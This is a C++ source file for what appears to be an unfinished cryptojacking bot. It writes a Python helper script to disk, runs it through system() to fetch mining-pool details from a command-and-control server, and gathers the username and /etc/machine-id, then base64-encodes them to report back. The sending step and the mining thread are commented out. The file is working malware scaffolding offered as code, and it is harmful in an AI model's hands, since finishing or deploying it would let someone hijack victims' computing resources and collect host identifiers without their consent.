// #include "communication.h"
// #include "tasks.h"
#include <iostream>
#include <string>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <stdio.h>
#include <pwd.h>
#include <sys/stat.h>
#include "base64.h"

typedef struct pool_info{
    char * pool, *id;
}pool_info;

void drop_python_script(){
    const char *script = R"(import urllib.request, json, time
from sys import argv, exit
#usage :
#  python3 communication.py get_pool
#  python3 communication.py post

# Errors
# -1 invalid sintaxe
# -2 offline

# Invalid usage
def error():
    exit(-1)

# Offline server or computer
def offline():
    exit(-2)

url = 'http://127.0.0.1'
arq = 'mining_pool_info_file.txt'

def get_mining_pool_info():
    try:
        req = urllib.request.urlopen(url).read()
    except urllib.error.URLError:
        offline()
    except:
        offline()
    
    print(req)
    List = json.loads(req)

    with open(arq, 'w') as f:
        f.write(str(List[0]) + '\n')
        f.write(str(List[1]))
    
    exit(0)

# send msg to server
def post(msg):
    pass

if __name__ == '__main__':
    if(len(argv) < 2):
        error()

    if(argv[1] == 'get_pool'):
        get_mining_pool_info()
    
    elif(argv[1] == 'post'):
        if(len(argv) > 2):
            post(argv[2])
        else:
            error()

    else:
        error()
)";

    FILE *f = fopen("communication.py", "w+");
    fprintf(f, "%s", script);
    fclose(f);
}


pool_info* get_pool_info(){
    char * get_pool = "python3 communication.py get_pool";
    
    int ret = system(get_pool);
    if(ret != 0){
        std::cout << "[-] Couldn't Get pool info, server possible be offline or no internet connection." << std::endl;
        exit(-1);
    }
    pool_info *pool = (pool_info*) malloc(sizeof(pool_info));
    pool->id = (char *) malloc(sizeof(char) * 500);
    pool->pool =(char *) malloc(sizeof(char) * 500);

    FILE *f = fopen("mining_pool_info_file.txt", "r");
    fscanf(f, "%s", pool->id);
    fscanf(f, "%s", pool->pool);
    fclose(f);
    return pool;
}

char * get_username(){
    struct passwd *pw;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    return pw->pw_name;
}

char * get_machine_id(){
    FILE * f = fopen("/etc/machine-id", "r");
    char * id = (char *)malloc(32);
    fscanf(f, "%s", id);
    fclose(f);
    return id;
}

void new_miner(){
    char * name = get_username();
    char *id = get_machine_id();
    std::string send = std::string(name) += std::string(" ") += std::string(id);
    std::string encoded = Base64::base64_encode(send);
    std::string x;
    const char * a = (x = std::string("python3 communication.py post ") += encoded).c_str();
    //system(a);
    std::cout << a << std::endl;
}


int main(int argc, char * argv[]){

    std::cout << "Dropping python script on machine" << std::endl;
    drop_python_script();

    std::cout << "Getting pool information ..." << std::endl;
    pool_info * pool = get_pool_info();
    std::cout << "Mining POOL: {id} = "<< pool->id << " {pool} = " << pool->pool << std::endl;
    
    std::cout << "Sending to server miner ID ..." << std::endl;
    new_miner();

    //std::cout << "Starting thread to mine ..." << std::endl;
    //std::thread multithreading(Tasks::check_task_manager); // thread creation
    // Tasks::check_task_manager();
    // if(Tasks::lock_task_manager){
    //     std::cout << "true" << std::endl;
    // }else{
    //     std::cout << "false" << std::endl;
    // }

    // desalocate memory
    // free(pool->id);
    // free(pool->pool);
    // free(pool);
    
}